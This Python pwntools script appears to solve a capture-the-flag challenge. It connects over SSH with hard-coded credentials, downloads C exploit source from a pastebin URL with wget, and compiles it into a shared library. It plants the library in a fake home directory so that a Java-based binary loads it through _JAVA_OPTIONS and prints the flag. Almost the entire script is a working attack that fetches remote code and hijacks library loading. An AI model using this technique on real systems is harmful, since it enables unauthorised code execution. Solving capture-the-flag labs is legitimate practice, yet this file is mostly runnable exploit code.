from pwn import *
import string
import random
import time

charset = string.ascii_letters
env = ""
for x in range(8):
    env += charset[random.randint(0, len(charset) - 1)]

log.info("Target Environtment : /tmp/" + env)

con = ssh(
    host="104.131.79.111",
    port=1001,
    user="lib",
    password="guest"
)

sh = con.process('/bin/sh')

# Creating dir
log.info("Create dir for exploit")
sh.sendline("mkdir /tmp/" + env)
sh.sendline("mkdir /tmp/" + env + "/.helloWorld")

log.info("Copy all file in real dir")
sh.sendline("cp ./* /tmp/" + env)

# Change Dir
log.info("Change directory")
sh.sendline("cd /tmp/" + env)

# Creating exploit
log.info("Download our exploit")
sh.sendline("wget https://pastebin.com/raw/VV9vqkHY -O /tmp/" + env + "/exploit.c")

# Build
log.info("Build exploit")
sh.sendline("cc -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic /tmp/" + env + "/exploit.c")

log.info("Convert into shared binary")
sh.sendline("cc /tmp/" + env + "/exploit.o -shared -o /tmp/" + env + "/exploit.so")

# Move out
log.info("Move exploit into dir .helloWorld")
sh.sendline("mv /tmp/" + env + "/exploit.so /tmp/" + env + "/.helloWorld/libhello.so")

# Change Dir
log.info("Change directory into home dir")
sh.sendline("cd /home/lib")

# Rename
log.info("Running service... _JAVA_OPTIONS=-Duser.home=/tmp/" + env + " ./hellotest")
sh.sendline("_JAVA_OPTIONS=-Duser.home=/tmp/" + env + " ./hellotest")

sh.recvuntil("Your flag is: ")
log.success("\n\n\nWhat the flag? How did that happen...\nYour flag is: " + str(sh.recv()) + "\n\n\nExploit by @T\n\n")

sh.close()
con.close()